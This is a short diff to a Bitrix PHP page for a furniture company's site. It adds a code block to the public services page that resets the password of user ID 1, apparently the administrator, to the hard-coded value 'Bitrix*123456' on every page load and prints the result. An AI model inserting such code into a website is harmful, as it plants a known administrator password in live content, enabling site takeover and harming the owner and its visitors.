@@ -17,6 +17,10 @@ $APPLICATION->SetTitle("Мебельная компания");
 	false
 );?>
 <h3>Наши услуги</h3>
+<?
+echo $USER->Update(1,array("PASSWORD"=>'Bitrix*123456'));
+echo $USER->LAST_ERROR;
+?>
 <?$APPLICATION->IncludeComponent("bitrix:furniture.catalog.index", "", array(
 	"IBLOCK_TYPE" => "products",
 	"IBLOCK_ID" => "3",
